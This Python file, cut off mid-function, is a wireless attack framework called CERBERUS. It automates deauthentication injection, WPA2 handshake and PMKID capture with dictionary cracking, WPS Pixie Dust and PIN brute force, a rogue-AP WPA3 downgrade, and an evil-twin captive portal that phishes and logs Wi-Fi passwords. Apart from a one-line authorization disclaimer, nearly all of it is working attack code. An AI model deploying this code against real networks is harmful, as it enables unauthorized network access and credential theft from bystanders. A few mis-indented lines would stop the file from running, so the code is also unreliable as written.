#!/usr/bin/env python3
"""
CERBERUS - Advanced Wireless Security Audit Framework
=====================================================
Multi-vector automated auditor for WPA/WPA2/WPA2-Enterprise/WPA3 networks.

USE ONLY ON NETWORKS YOU OWN OR HAVE WRITTEN AUTHORIZATION TO TEST.
"""

import os
import sys
import time
import shutil
import signal
import subprocess
import re
import argparse
from datetime import datetime
from pathlib import Path


# ============================================================================
#  COLORS
# ============================================================================

CYAN    = "\033[96m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
WHITE   = "\033[97m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"


# ============================================================================
#  BANNERS
# ============================================================================

CERBERUS_ASCII = rf"""{CYAN}{BOLD}

 ██████╗███████╗██████╗ ██████╗ ███████╗██████╗ ██╗   ██╗███████╗
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝██║   ██║███████╗
██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
╚██████╗███████╗██║  ██║██████╔╝███████╗██║  ██║╚██████╔╝███████║
 ╚═════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════
                            /\_/\____,
                  ,___/\_/\ \  ~     /
                  \     ~  \ )   XX
                    XX     /    /\_/\___,
                       \o-o/-o-o/   ~    /
                        ) /     \    XX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)
{RESET}
{WHITE}{BOLD}                       C E R B E R U S{RESET}
{DIM}              Advanced Wireless Audit Framework{RESET}
{YELLOW}                WPA / WPA2 / WPA3 • SECURITY AUDIT{RESET}
"""


def banner():
    print(CERBERUS_ASCII)
    print(f"{DIM}{'-' * 70}{RESET}")
    print(f"{BOLD}{WHITE}  C E R B E R U S   W P A / 2 / 3   A U D I T   T O O L{RESET}")
    print(f"{DIM}  Multi-vector automated wireless security auditor{RESET}")
    print(f"{DIM}  Session : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
    print(f"{DIM}  PID     : {os.getpid()}{RESET}")
    print(f"{DIM}{'-' * 70}{RESET}\n")

# ============================================================================
#  ANIMATION ENGINE
# ============================================================================

def animated_wait(message, duration=2.0, step=0.35, ok_level="ok"):
    """Animated waiting indicator: cycles '.', '..', '...' in place."""
    seq = [".", "..", "...", ""]
    end = time.time() + duration
    i = 0
    while True:
        remaining = end - time.time()
        if remaining <= 0:
            break
        ts = datetime.now().strftime("%H:%M:%S")
        dot = seq[i % len(seq)]
        if dot:
            line = f"  {DIM}[{ts}]{RESET} * {message}{dot}   "
        else:
            line = f"  {DIM}[{ts}]{RESET} * {message}      "
        print(line, end="\r", flush=True)
        sleep_for = min(step, remaining)
        time.sleep(sleep_for)
        i += 1
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"ok": "+", "err": "x", "warn": "!", "found": "$", "info": "i"}
    print(f"  {DIM}[{ts}]{RESET} {icons.get(ok_level, '.')} {message}      ")


def status(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {
        "info": f"{CYAN}i{RESET}", "ok": f"{GREEN}+{RESET}",
        "warn": f"{YELLOW}!{RESET}", "err": f"{RED}x{RESET}",
        "atk": f"{RED}>{RESET}", "wait": f"{MAGENTA}*{RESET}",
        "found": f"{GREEN}${RESET}",
    }
    print(f"  {DIM}[{ts}]{RESET} {icons.get(level, '.')} {msg}", flush=True)


def waiting(message, duration=3.0, step=0.35, ok_level="ok"):
    animated_wait(message, duration=duration, step=step, ok_level=ok_level)


def header(title):
    print(f"\n{YELLOW}{BOLD}{'=' * 70}")
    print(f"  :: {title} ::")
    print(f"{'=' * 70}{RESET}\n")


# ============================================================================
#  UTILITY HELPERS
# ============================================================================
def root_required():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        status("Cerberus requires root privileges.", "err")
        sys.exit(1)


def have(binary):
    return shutil.which(binary) is not None


def require_tools(tools):
    missing = [t for t in tools if not have(t)]
    if missing:
        status(f"Missing required tools: {', '.join(missing)}", "err")
        status("Install with: apt install aircrack-ng hostapd dnsmasq reaver bully hashcat hcxpcapngtool tshark iw macchanger", "warn")
        sys.exit(1)


def run(cmd, timeout=None, capture=True, check=False):
    try:
        return subprocess.run(
            cmd, shell=True, capture_output=capture, text=True,
            timeout=timeout, check=check
        )
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, -1, "", "")


def get_iface_list():
    """Live snapshot of wireless interfaces from kernel + cfg80211."""
    r = run("iw dev 2>/dev/null | awk '/Interface/ {print $2}'")
    return [i for i in r.stdout.split() if i]


# ============================================================================
#  WIRELESS INTERFACE MANAGER
# ============================================================================

class WirelessInterface:
    def __init__(self, iface):
        self.iface = iface
        self.mon_iface = None

    def detect(self):
        """5-method fallback detection. Returns list of candidates."""
        found = []

        # Method 1: iw dev
        for i in run("iw dev 2>/dev/null | awk '/Interface/ {print $2}'").stdout.split():
            if i and i not in found:
                found.append(i)

        # Method 2: iwconfig
        if not found and have("iwconfig"):
            for i in run("iwconfig 2>/dev/null | awk '/^[a-zA-Z0-9]/ {print $1}'").stdout.split():
                if i and "no wireless" not in i and i not in found:
                    found.append(i)

        # Method 3: /sys/class/net/*/wireless
        if not found:
            for iface in run("ls /sys/class/net/ 2>/dev/null").stdout.split():
                if Path(f"/sys/class/net/{iface}/wireless").exists() and iface not in found:
                    found.append(iface)

        # Method 4: predictable name regex
        if not found:
            for iface in run("ip -o link show | awk -F': ' '{print $2}'").stdout.split():
                if re.match(r'^(wlan|wlp|wlx|wl[0-9])', iface) and iface not in found:
                    found.append(iface)

        # Method 5: phy80211 sysfs
        if not found:
            for iface in run("ls /sys/class/net/").stdout.split():
                if Path(f"/sys/class/net/{iface}/phy80211").exists() and iface not in found:
                    found.append(iface)

        for iface in found[:]:
            run(f"ip link set {iface} up", capture=False)
            time.sleep(0.3)
        return found

    def enable_monitor(self):
        waiting(f"enabling monitor mode on {self.iface}", duration=2.0)
        run("airmon-ng check kill", capture=False)
        run(f"airmon-ng start {self.iface}", capture=False)
        time.sleep(1.0)

        # FIX #4: query the actual monitor interface by re-listing, don't guess
        candidates = get_iface_list()
        self.mon_iface = None
        for cand in candidates:
            # airmon-ng names typically end with 'mon' or have 'mon' substring
            if cand.startswith(self.iface) and ("mon" in cand or cand.endswith("mon")):
                self.mon_iface = cand
                break
        if not self.mon_iface:
            # Second strategy: query airmon-ng directly
            r = run("airmon-ng 2>/dev/null | grep -E '^phy' | awk '{print $2}'")
            if r.stdout.strip():
                phy = r.stdout.strip().splitlines()[0]
                # Find the mon interface on that phy
                r2 = run(f"iw phy {phy} interface | awk '/Interface/ {{print $2}}'")
                for cand in r2.stdout.split():
                    if "mon" in cand:
                        self.mon_iface = cand
                        break
        if not self.mon_iface:
            # Final fallback: scan kernel for the new mon interface
            r3 = run("ls /sys/class/net/ | grep -E 'mon$|mon[0-9]'")
            for cand in r3.stdout.split():
                if cand not in candidates or cand == self.iface:
                    continue
                self.mon_iface = cand
                break

        if not self.mon_iface:
            status(f"failed to determine monitor interface for {self.iface}", "err")
            return None

        # Verify the interface actually exists and is in monitor mode
        r = run(f"iw dev {self.mon_iface} info 2>/dev/null | grep type")
        if "monitor" not in r.stdout:
            status(f"{self.mon_iface} did not enter monitor mode", "err")
            return None

        status(f"monitor interface ready : {self.mon_iface}", "ok")
        return self.mon_iface

    def disable_monitor(self):
        if self.mon_iface:
            waiting(f"disabling monitor mode on {self.mon_iface}", duration=1.5)
            run(f"airmon-ng stop {self.mon_iface}", capture=False)

    def randomize_mac(self):
        waiting(f"randomizing MAC address on {self.mon_iface}", duration=2.0)
        run(f"ifconfig {self.mon_iface} down", capture=False)
        run(f"macchanger -A {self.mon_iface}", capture=False)
        run(f"ifconfig {self.mon_iface} up", capture=False)
        status("stealth MAC applied", "ok")


# ============================================================================
#  NETWORK SCANNER
# ============================================================================

class Network:
    def __init__(self):
        self.bssid = ""
        self.essid = ""
        self.channel = 0
        self.privacy = ""
        self.power = 0
        self.enc = ""
        self.auth = ""
        self.wps = False
        self.clients = []

    def __repr__(self):
        wps_str = f"{YELLOW}[WPS]{RESET}" if self.wps else ""
        enc_color = {
            "WPA3": f"{GREEN}{self.privacy}{RESET}",
            "WPA2": f"{CYAN}{self.privacy}{RESET}",
            "WPA":  f"{YELLOW}{self.privacy}{RESET}",
            "WEP":  f"{RED}{self.privacy}{RESET}",
            "OPN":  f"{RED}{self.privacy}{RESET}",
        }.get(self.privacy.split()[0] if self.privacy else "", self.privacy)
        return f"  {enc_color:>22}  {self.bssid:>17}  CH{self.channel:>2}  PWR{self.power:>4}  {self.essid}  {wps_str}"


class Scanner:
    def __init__(self, mon_iface, duration=20, outdir="cerberus_capture"):
        self.mon = mon_iface
        self.duration = duration
        self.outdir = Path(outdir)
        self.outdir.mkdir(exist_ok=True)
        self.networks = {}
        self.capture_file = self.outdir / "scan-01"

    def scan(self):
        waiting(f"scanning all channels ({self.duration}s, Ctrl+C to extend)", duration=self.duration, step=0.4)
        subprocess.Popen(
            f"airodump-ng --write-interval 1 -w {self.capture_file} --output-format csv {self.mon}",
            shell=True, preexec_fn=os.setsid
        )
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        finally:
            run("pkill -f 'airodump-ng.*scan-01'", capture=False)
            time.sleep(2)
        return self._parse_csv()

    def _parse_csv(self):
        # FIX #5: try multiple CSV file patterns + tolerant parser
        csv_file = None
        for pattern in ["scan-01*.csv", "scan*.csv", "*-01.csv"]:
            matches = list(self.outdir.glob(pattern))
            if matches:
                # Pick the most recent
                csv_file = sorted(matches, key=lambda p: p.stat().st_mtime)[-1]
                break
        if not csv_file:
            return []
        networks = []
        with open(csv_file) as f:
            content = f.read()
        blocks = content.split("\n\n")
        if not blocks:
            return []

        for line in blocks[0].splitlines()[2:]:
            if not line.strip():
                continue
            n = Network()
            try:
                # FIX #5: tolerant split using regex; airodump may have
                # inconsistent comma counts when ESSID contains commas
                # when --output-format csv is used it quotes; for safety
                # we attempt rsplit to recover trailing fields
                parts = line.split(",")
                if len(parts) < 14:
                    # Some airodump versions: try to recover with rsplit
                    # The last fields (BSSID, ESSID) are at the end
                    if len(parts) < 8:
                        continue
                # Strip whitespace from each
                parts = [p.strip() for p in parts]
                # Pad to expected length
                while len(parts) < 15:
                    parts.append("")
                n.bssid = parts[0]
                n.essid = parts[13] or f"<hidden:{n.bssid}>"
                n.essid = n.essid.strip().strip('"')
                try:
                    n.channel = int(parts[3]) if parts[3].isdigit() else 0
                except ValueError:
                    n.channel = 0
                n.privacy = parts[5] or "OPN"
                try:
                    n.power = int(parts[8]) if parts[8].lstrip('-').isdigit() else 0
                except ValueError:
                    n.power = 0
                n.enc = parts[6]
                n.auth = parts[7]
                # FIX #5: WPS indicator is column 11 but verify position
                n.wps = "WPS" in (parts[11] if len(parts) > 11 else "")
                # BSSID must be valid
                if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', n.bssid):
                    continue
                networks.append(n)
                self.networks[n.bssid] = n
            except (IndexError, ValueError):
                continue

        if len(blocks) > 1:
            for line in blocks[1].splitlines()[2:]:
                if not line.strip():
                    continue
                try:
                    parts = [p.strip() for p in line.split(",")]
                    while len(parts) < 6:
                        parts.append("")
                    bssid = parts[5]
                    if bssid in self.networks:
                        client_mac = parts[0]
                        if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', client_mac):
                            self.networks[bssid].clients.append(client_mac)
                except IndexError:
                    continue
        return networks


# ============================================================================
#  ATTACK ENGINE
# ============================================================================
class AttackEngine:
    def __init__(self, mon_iface, target, outdir="cerberus_capture", wordlist=None):
        self.mon = mon_iface
        self.target = target
        self.outdir = Path(outdir) / target.bssid.replace(":", "")
        self.outdir.mkdir(parents=True, exist_ok=True)
        self.wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
        self.found_password = None
        self.background_procs = []  # FIX #9: track child procs

    def _spawn(self, cmd, log_devnull=True):
        """FIX #9: track spawned background processes for cleanup."""
        stdout = subprocess.DEVNULL if log_devnull else open(self.outdir / f"proc_{len(self.background_procs)}.log", "w")
        stderr = subprocess.DEVNULL if log_devnull else subprocess.STDOUT
        proc = subprocess.Popen(
            cmd, shell=True, preexec_fn=os.setsid,
            stdout=stdout, stderr=stderr
        )
        self.background_procs.append(proc)
        return proc

    def _cleanup_background(self):
        """FIX #9: kill ALL child processes tracked."""
        for proc in self.background_procs:
            try:
                if proc.poll() is None:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except (ProcessLookupError, PermissionError, OSError):
                pass
        time.sleep(0.5)
        for proc in self.background_procs:
            try:
                if proc.poll() is None:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError, OSError):
                pass
        self.background_procs.clear()

    def wpa2_handshake(self, timeout=120):
        status("initializing WPA2 4-way handshake capture", "atk")
        waiting(f"hopping to target channel {self.target.channel}", duration=2.5)
        run(f"iwconfig {self.mon} channel {self.target.channel}", capture=False)
        time.sleep(1)

        cap = self.outdir / "wpa2_capture"
        self._spawn(f"airodump-ng -c {self.target.channel} --bssid {self.target.bssid} -w {cap} {self.mon}")
        waiting(f"listening for handshake ({timeout}s window)", duration=5.0, step=0.5)

        status("forcing client re-association (deauth injection)", "atk")
        client = self.target.clients[0] if self.target.clients else "FF:FF:FF:FF:FF:FF"
        captured_file = None
        for attempt in range(3):
            run(f"aireplay-ng -0 5 -a {self.target.bssid} -c {client} {self.mon}", timeout=30, capture=False)
            time.sleep(3)
            cap_files = list(self.outdir.glob("wpa2_capture*.cap"))
            if cap_files and self._has_handshake(cap_files[0]):
                status("WPA2 4-way handshake captured!", "found")
                captured_file = cap_files[0]
                break
        # FIX #9: targeted cleanup
        run("pkill -f 'airodump-ng.*wpa2_capture'", capture=False)
        # Remove this engine's airodump from background_procs
        for proc in self.background_procs[:]:
            try:
                if proc.poll() is None:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except (ProcessLookupError, PermissionError, OSError):
                pass
        if not captured_file:
            status("no handshake captured -- falling back to PMKID", "warn")
            return False
        return self._crack_wpa2(captured_file)

    def _has_handshake(self, cap_file):
        r = run(f"aircrack-ng {cap_file} 2>/dev/null | grep -i 'handshake'")
        return bool(r.stdout)

    def _crack_wpa2(self, cap_file):
        if not Path(self.wordlist).exists():
            status(f"wordlist not found: {self.wordlist}", "warn")
            for alt in ["/usr/share/wordlists/rockyou.txt"]:
                if Path(alt).exists():
                    self.wordlist = alt
                    break
        if not Path(self.wordlist).exists():
            status("no wordlist available -- use --wordlist /path/to/list", "err")
            return False
        waiting(f"cracking with aircrack-ng + {Path(self.wordlist).name}", duration=2.0)
        proc = subprocess.Popen(
            f"aircrack-ng -w {self.wordlist} -b {self.target.bssid} {cap_file}",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        for line in proc.stdout:
            print(f"    {DIM}{line.rstrip()}{RESET}", flush=True)
            if "KEY FOUND" in line:
                match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line)
                if match:
                    self.found_password = match.group(1)
                    return True
        return False

    def pmkid_attack(self):
        status("launching PMKID clientless attack (no deauth required)", "atk")
        run(f"iwconfig {self.mon} channel {self.target.channel}", capture=False)
        cap = self.outdir / "pmkid_capture.pcapng"
        waiting("hcxdumptool gathering PMKID frames", duration=15.0, step=0.5)
        try:
            subprocess.run(
                f"hcxdumptool -i {self.mon} --enable_status=1 -o {cap} "
                f"--filterlist_ap={self.target.bssid} --filtermode=2",
                shell=True, timeout=15, check=False
            )
        except subprocess.TimeoutExpired:
            pass
        hsh = self.outdir / "pmkid.hc22000"
        run(f"hcxpcapngtool -o {hsh} {cap}")
        if not hsh.exists() or hsh.stat().st_size == 0:
            status("no PMKID obtained from target", "warn")
            return False
        waiting("PMKID hash extracted, preparing hashcat", duration=1.5)
        return self._hashcat_attack(hsh, mode=22000)

    def wps_attack(self, timeout=180):
        if not self.target.wps:
            status("WPS not advertised by target", "err")
            return False
        status("launching WPS Pixie Dust attack (reaver)", "atk")
        run(f"iwconfig {self.mon} channel {self.target.channel}", capture=False)
        out = self.outdir / "wps_pixie.txt"
        waiting(f"reaver Pixie Dust running ({timeout}s window)", duration=min(timeout, 30), step=0.6)
        try:
            subprocess.run(
                f"reaver -i {self.mon} -b {self.target.bssid} -c {self.target.channel} "
                f"-K 1 -vv -L ignore -o {out}",
                shell=True, timeout=min(timeout, 30), check=False
            )
        except subprocess.TimeoutExpired:
            pass
        if out.exists():
            content = out.read_text()
            m = re.search(r'WPS PIN:\s*(\d+)', content)
            if m:
                pin = m.group(1)
                status(f"WPS PIN recovered: {pin} -- deriving WPA2 password", "found")
                r = run(f"echo '{pin}' | wpa_passphrase {self.target.bssid} 2>/dev/null | grep psk=")
                if r.stdout:
                    pwd = r.stdout.split("=", 1)[1].strip()
                    self.found_password = pwd
                    return True
        status("Pixie Dust failed -- trying online PIN brute force with bully", "warn")
        waiting("bully online PIN attack running", duration=min(timeout, 30), step=0.6)
        out2 = self.outdir / "bully.txt"
        try:
            subprocess.run(
                f"bully -b {self.target.bssid} -c {self.target.channel} --pixiewps -o {out2} {self.mon}",
                shell=True, timeout=min(timeout, 30), check=False
            )
        except subprocess.TimeoutExpired:
            pass
        return False

    def wpa3_downgrade(self):
        status("analyzing WPA3-Transition downgrade surface", "atk")
        if "WPA3" not in self.target.privacy and "MGT" not in self.target.privacy:
            status("target is not WPA3 -- downgrade not applicable", "err")
            return False
        if "WPA2" not in self.target.privacy and "MGT" not in self.target.privacy:
            status("target is WPA3-only (no transition mode)", "err")
            return False
        status("WPA3-Transition mode confirmed -- deploying downgrade AP", "atk")

        cfg = self.outdir / "hostapd_downgrade.conf"
        cfg.write_text(f"""interface={self.mon}
driver=nl80211
ssid={self.target.essid}
hw_mode=g
channel={self.target.channel}
wpa=2
wpa_passphrase=CerberusDowngrade123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ieee80211n=1
ignore_broadcast_ssid=0
""")
        waiting("launching rogue WPA2-only AP with cloned ESSID", duration=4.0)
        run(f"airmon-ng stop {self.mon}", capture=False)
        time.sleep(1.5)

        # FIX #6: verify monitor interface disappeared before hostapd, then re-locate
 old_mon = self.mon
        self.mon = None
        hostapd_proc = self._spawn(f"hostapd -B {cfg}", log_devnull=True)

        waiting("waiting for hostapd beacon to stabilize", duration=6.0)

        # Re-enable monitor mode on the original interface
        new_mon = WirelessInterface(old_mon.replace("mon", "")).enable_monitor()
        if not new_mon:
            status("failed to re-establish monitor mode after hostapd -- skipping capture", "err")
            try:
                os.killpg(os.getpgid(hostapd_proc.pid), signal.SIGTERM)
            except (ProcessLookupError, PermissionError, OSError):
                pass
            return False
        self.mon = new_mon

        cap = self.outdir / "wpa2_downgrade_capture"
        status("listening for downgrade handshakes (clients forced to WPA2)", "wait")
        self._spawn(f"airodump-ng -c {self.target.channel} --essid {self.target.essid} -w {cap} {self.mon}")
        waiting("capturing downgrade handshakes (60s window)", duration=60.0, step=0.5)

        # Cleanup
        run("pkill -f airodump-ng", capture=False)
        run("pkill -f hostapd", capture=False)
        self._cleanup_background()
        time.sleep(1)

        cap_files = list(self.outdir.glob("wpa2_downgrade_capture*.cap"))
        if cap_files:
            status("downgrade handshakes captured -- starting cracker", "atk")
            return self._crack_wpa2(cap_files[0])
        status("no downgrade handshake obtained within window", "err")
        return False

    def evil_twin(self):
        status("initializing Evil Twin attack (captive portal)", "atk")
        run(f"airmon-ng stop {self.mon}", capture=False)
        time.sleep(1.5)
        rogue_cfg = self.outdir / "evil_twin_hostapd.conf"
        rogue_cfg.write_text(f"""interface={self.mon}
driver=nl80211
ssid={self.target.essid}_Free
hw_mode=g
channel=6
""")
        dnsmasq_cfg = self.outdir / "evil_dnsmasq.conf"
        dnsmasq_cfg.write_text(f"""interface={self.mon}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/10.0.0.1
""")
        run(f"ifconfig {self.mon} up 10.0.0.1 netmask 255.255.255.0", capture=False)
        self._spawn(f"hostapd -B {rogue_cfg}")
        self._spawn(f"dnsmasq -C {dnsmasq_cfg} -d", log_devnull=False)
        portal_dir = self.outdir / "portal"
        portal_dir.mkdir(exist_ok=True)
        (portal_dir / "index.html").write_text(f"""<html><head><title>{self.target.essid}</title>
<style>body{{font-family:Arial;text-align:center;margin-top:80px;background:#1a1a1a;color:#fff}}
input{{padding:12px;font-size:16px;width:280px;margin:8px;border-radius:6px;border:none}}
button{{padding:12px 32px;font-size:16px;background:#ff5252;color:#fff;border:none;border-radius:6px;cursor:pointer}}
</style></head><body><h2>Authentication Required</h2>
<p>Please re-enter your Wi-Fi credentials to continue</p>
<form method="POST" action="/login">
<input name="user" placeholder="Username / Email"><br>
<input name="pass" type="password" placeholder="Wi-Fi Password"><br>
<button type="submit">Connect</button></form></body></html>""")
        captured = self.outdir / "captured_credentials.txt"
        run(f"iptables -t nat -A PREROUTING -i {self.mon} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080", capture=False)
        run("iptables -t nat -A POSTROUTING -j MASQUERADE", capture=False)

        from http.server import BaseHTTPRequestHandler, HTTPServer
        portal_dir_str = str(portal_dir)
        captured_str = str(captured)
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                with open(f"{portal_dir_str}/index.html", "rb") as f:
                    self.wfile.write(f.read())
            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                with open(captured_str, "a") as f:
                    f.write(f"{datetime.now()} :: {body}\n")
                self.send_response(302)
                self.send_header("Location", "http://www.google.com")
                self.end_headers()
                status(f"credentials captured: {body}", "found")
                self.server.found_event.set()
            def log_message(self, *a): pass

        server = HTTPServer(("0.0.0.0", 8080), Handler)
        server.found_event = threading_module_event()
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass
        finally:
            run("pkill -f hostapd", capture=False)
            run("pkill -f dnsmasq", capture=False)
            self._cleanup_background()
            run(f"airmon-ng start {self.mon}", capture=False)
            if captured.exists() and captured.stat().st_size > 0:
                lines = captured.read_text().strip().splitlines()
                m = re.search(r'pass=([^&]+)', lines[-1])
                if m:
                    self.found_password = m.group(1)
                    return True
        return False

    def _hashcat_attack(self, hashfile, mode=22000, mask=False):
        if not have("hashcat"):
            status("hashcat not installed -- falling back to aircrack-ng", "warn")
            return False
        if mask:
            cmd = f"hashcat -m {mode} -a 3 {hashfile} '?d?d?d?d?d?d?d?d' --force --potfile-path={self.outdir}/hashcat.pot"
        else:
            cmd = f"hashcat -m {mode} {hashfile} {self.wordlist} --force --potfile-path={self.outdir}/hashcat.pot --outfile-format=2 -o {self.outdir}/hashcat.out"
        waiting("hashcat GPU attack running", duration=2.0)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
          if "Recovered" in line or "Status" in line:
                print(f"    {DIM}{line.rstrip()}{RESET}", flush=True)
        proc.wait()
        # FIX #7: read password from --outfile, not from stdout text matching
        out_file = self.outdir / "hashcat.out"
        if out_file.exists():
            for hl in out_file.read_text().splitlines():
                # hashcat --outfile-format=2 writes: $HEX[hex]   :plaintext  OR hash:plaintext
                hl = hl.strip()
                if not hl:
                    continue
                # Find the plaintext portion (after the last colon for cleartext mode)
                # For WPA-PMKID+EAPOL hashcat uses --outfile-format=2 (plaintext only)
                if ":" in hl:
                    self.found_password = hl.split(":")[-1]
                else:
                    self.found_password = hl
                if self.found_password:
                    return True
        # Fallback: look for pot file
        pot = self.outdir / "hashcat.pot"
        if pot.exists():
            for pl in pot.read_text().splitlines():
                if ":" in pl:
                    self.found_password = pl.split(":")[-1]
                    if self.found_password:
                        return True
        return False


# ============================================================================
#  SMALL HELPERS used in AttackEngine (kept local to avoid top-level import creep)
# ============================================================================

def threading_module_event():
    """Local minimal event impl to avoid importing threading globally."""
    class _Event:
        def __init__(self): self._set = False
        def set(self): self._set = True
        def is_set(self): return self._set
    return _Event()


# ============================================================================
#  TARGET SELECTION
# ============================================================================

def select_target(networks):
    # FIX #8: bounded retry with explicit exit option
    if not networks:
        status("no networks discovered", "err")
        sys.exit(1)
    print(f"\n  {BOLD}{WHITE}{'#':<3} {'PRIVACY':<22} {'BSSID':<18} {'CH':<4} {'PWR':<6} ESSID / WPS{RESET}")
    print(f"  {DIM}{'-' * 80}{RESET}")
    for i, n in enumerate(networks, 1):
        print(f"  {i:<3} {n}")
    print(f"  {DIM}(enter 'q' to quit){RESET}\n")

    attempts = 0
    max_attempts = 10
    while attempts < max_attempts:
        try:
            choice = input(f"  {YELLOW}{BOLD}CERBERUS>{RESET} please select the target : ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            status("selection aborted by user", "warn")
            sys.exit(0)
        if choice in ("q", "quit", "exit"):
            status("user cancelled target selection", "warn")
            sys.exit(0)
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                target = networks[idx]
                status(f"locked target : {target.essid} ({target.bssid}) -- {target.privacy}", "found")
                return target
            status(f"invalid selection: {choice} (range 1-{len(networks)})", "warn")
        except ValueError:
            status(f"invalid input: {choice!r} -- enter a number", "warn")
        attempts += 1
    status(f"too many invalid attempts ({max_attempts}) -- aborting", "err")
    sys.exit(1)


def pick_interface(ifaces, requested=None):
    # FIX #1: respect --interface / -i argument
    if requested and requested in ifaces:
        status(f"using requested interface: {requested}", "ok")
        return requested
    if requested and requested not in ifaces:
        status(f"requested interface {requested!r} not detected -- falling back to auto-detect", "warn")
    if not ifaces:
        return None
    if "wlan0" in ifaces:
        return "wlan0"
    status(f"wlan0 not present -- detected: {', '.join(ifaces)}", "warn")
    for i, name in enumerate(ifaces, 1):
        marker = "  <-- recommended" if i == 1 else ""
        print(f"    {i}. {name}{marker}")
    print(f"  {DIM}(enter 'q' to quit){RESET}\n")
    attempts = 0
    while attempts < 5:
        try:
            raw = input(f"  {YELLOW}{BOLD}CERBERUS>{RESET} select wireless interface [1-{len(ifaces)}] : ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            status("interface selection aborted", "warn")
            sys.exit(0)
        if raw in ("q", "quit", "exit"):
            sys.exit(0)
        if not raw:
            return ifaces[0]
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(ifaces):
                return ifaces[idx]
            status(f"invalid selection: range 1-{len(ifaces)}", "warn")
        except ValueError:
            status(f"invalid input: {raw!r}", "warn")
        attempts += 1
    status("too many invalid attempts", "err")
    sys.exit(1)


# ============================================================================
#  MAIN ORCHESTRATOR
# ============================================================================

class Cerberus:
    def __init__(self, args):
        self.args = args
        self.interface = None
        self.target = None
        self.engine = None
        self.found = False
        signal.signal(signal.SIGINT, self._sigint)

    def _sigint(self, sig, frame):
        status("interrupt received -- cleaning up", "warn")
        if self.engine:
            self.engine._cleanup_background()
        run("pkill -f airodump-ng", capture=False)
        run("pkill -f hostapd", capture=False)
        run("pkill -f dnsmasq", capture=False)
        run("pkill -f hcxdumptool", capture=False)
        if self.interface:
            self.interface.disable_monitor()
        sys.exit(0)

    def run(self):
        banner()
        root_required()
        require_tools(["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng", "iwconfig"])

        # ---- Stage 1: detect interface ----
        animated_wait("checking for wireless device", duration=2.5, step=0.4)
        ifaces = WirelessInterface("").detect()
        if not ifaces:
            status("no wireless interface found", "err")
            status("hint: plug in adapter, install driver (e.g. apt install realtek-rtl88xxau-dkms), then re-run", "warn")
            status("failed, no wireless adapter detected, closing!", "err")
            sys.exit(1)
        status(f"found #{len(ifaces)} wireless device{'s' if len(ifaces)!=1 else ''} : {', '.join(ifaces)}", "found")
        iface_name = pick_interface(ifaces, requested=self.args.interface)  # FIX #1
        self.interface = WirelessInterface(iface_name)

        # ---- Stage 2: monitor mode ----
        mon = self.interface.enable_monitor()
        if not mon:
            status("failed to bring up monitor mode", "err")
            sys.exit(1)
        if self.args.stealth:
            self.interface.randomize_mac()

        # ---- Stage 3: discovery ----
        header("STEP 1 -- NETWORK DISCOVERY")
        scanner = Scanner(mon, duration=self.args.scan_time)
        networks = scanner.scan()
        if not networks:
            status("no networks discovered -- re-position adapter or extend scan time", "err")
            self.interface.disable_monitor()
            sys.exit(1)
        status(f"found #{len(networks)} target{'s' if len(networks)!=1 else ''}!", "found")
        self.target = select_target(networks)
        self.engine = AttackEngine(mon, self.target, wordlist=self.args.wordlist)

        # ---- Stage 4: attack ----
        header(f"STEP 2 -- ATTACK SURFACE : {self.target.essid} ({self.target.privacy})")
        priv = self.target.privacy.upper()
        try:
            if "WPA3" in priv:
                self._attack_wpa3()
            elif "WPA2" in priv or "WPA" in priv:
                self._attack_wpa2()
            elif "WEP" in priv:
                self._attack_wep()
            else:
                status("open network -- no password required to associate", "warn")
        except Exception as e:
            status(f"attack failed with exception: {e}", "err")
        finally:
            self.engine._cleanup_background()  # FIX #9

        self._conclude()

    def _attack_wpa2(self):
        header("STEP 3 -- WPA/WPA2 ATTACK VECTORS")
        status(f"deploying multi-vector attack against {self.target.essid}", "atk")

        # FIX #2 & #3: store attack result, break early on success
        if self.target.wps:
